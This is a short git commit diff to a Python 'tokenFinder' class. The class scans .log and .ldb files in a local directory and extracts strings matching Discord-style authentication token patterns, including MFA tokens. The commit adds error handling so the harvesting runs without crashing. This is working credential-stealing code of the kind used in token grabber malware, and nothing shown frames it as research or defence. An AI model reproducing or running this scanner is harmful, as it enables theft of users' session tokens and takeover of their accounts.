38ef3e5a71f33ea57f144f8239bd53b24c494e2d
TanujKS <tanujsiripurapu@gmail.com>
2021-06-21 12:56:08 -0700

    Stable tokenFinder

--- src/tokenFinder.py
+++ src/tokenFinder.py
@@ -45,10 +45,14 @@ class TokenFinder:
         for file_name in os.listdir(path):
             if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                 continue
-            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
+            try:
+                for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            tokens.append(token)
+            except FileNotFoundError:
+                pass
+                
         return tokens
 
 
